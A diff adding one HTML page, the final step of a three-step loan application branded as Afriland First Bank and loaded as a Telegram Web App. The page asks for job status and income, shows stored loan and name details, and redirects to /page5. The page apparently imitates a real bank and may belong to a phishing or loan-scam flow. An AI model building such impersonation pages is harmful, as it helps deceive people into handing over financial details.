@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Afriland First Bank - Récapitulatif</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root { --purple-primary: #6b21a8; --purple-hover: #581c87; --bg-color: #f3f4f6; }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .app-header { width: 100%; background-color: var(--purple-primary); height: 60px; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
+        .back-btn { color: white; text-decoration: none; font-weight: 600; font-size: 15px; cursor: pointer; }
+        .header-title { position: absolute; left: 50%; transform: translateX(-50%); font-size: 18px; font-weight: 800; color: white; }
+        .card { background: white; width: 90%; max-width: 440px; margin: 20px 0 30px; padding: 32px 24px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
+        .main-title { font-size: 24px; color: #1f2937; margin: 0 0 6px; text-align: center; font-weight: 800; }
+        .subtext { font-size: 14px; color: #6b7280; text-align: center; margin-bottom: 20px; }
+        .step-indicator { display: flex; gap: 8px; margin: 0 auto 28px; width: 80%; }
+        .step-bar { flex: 1; height: 4px; background-color: var(--purple-primary); border-radius: 2px; }
+        .form-group { margin-bottom: 20px; display: flex; flex-direction: column; }
+        .form-group label { font-size: 14px; font-weight: 700; color: #374151; margin-bottom: 8px; }
+        .form-control { font-size: 15px; padding: 14px; border: 1px solid #d1d5db; border-radius: 10px; outline: none; width: 100%; }
+        .summary-card { background: #faf5ff; border-left: 4px solid var(--purple-primary); padding: 16px; border-radius: 8px; margin-bottom: 20px; }
+        .summary-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13.5px; }
+        .btn-next { background: var(--purple-primary); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: 800; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
+        .footer-banner { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: #6b7280; margin-top: auto; }
+    </style>
+</head>
+<body>
+<div class="app-header">
+    <a href="/page3" class="back-btn">← Retour</a>
+    <div class="header-title">Afriland First Bank</div>
+    <div style="width:24px"></div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">Finalisation</h1>
+    <div class="subtext">Étape 3 sur 3</div>
+    <div class="step-indicator">
+        <div class="step-bar"></div>
+        <div class="step-bar"></div>
+        <div class="step-bar"></div>
+    </div>
+
+    <form onsubmit="submitForm(event)">
+        <div class="form-group">
+            <label>Statut Professionnel</label>
+            <select id="jobStatus" class="form-control" required>
+                <option value="Salarié(e)" selected>Salarié(e)</option>
+                <option value="Fonctionnaire">Fonctionnaire</option>
+                <option value="Entrepreneur">Entrepreneur</option>
+                <option value="Autre">Autre</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label>Revenu Mensuel (XAF)</label>
+            <input type="number" id="income" class="form-control" placeholder="Ex: 350000" required>
+        </div>
+
+        <div class="summary-card">
+            <div class="summary-row"><span>Montant:</span> <strong id="sumAmt">--</strong></div>
+            <div class="summary-row"><span>Durée:</span> <strong id="sumDur">--</strong></div>
+            <div class="summary-row"><span>Nom:</span> <strong id="sumName">--</strong></div>
+        </div>
+
+        <button type="submit" class="btn-next">Soumettre le dossier</button>
+    </form>
+</div>
+
+<div class="footer-banner">© 2026 Afriland First Bank Cameroun</div>
+
+<script>
+    window.onload = () => {
+        document.getElementById('sumAmt').innerText = localStorage.getItem('appliedAmount') + " XAF";
+        document.getElementById('sumDur').innerText = localStorage.getItem('appliedTerm');
+        document.getElementById('sumName').innerText = (localStorage.getItem('firstName') || '') + ' ' + (localStorage.getItem('lastName') || '');
+    };
+
+    function submitForm(e) {
+        e.preventDefault();
+        window.location.href = "/page5";
+    }
+</script>
+</body>
+</html>
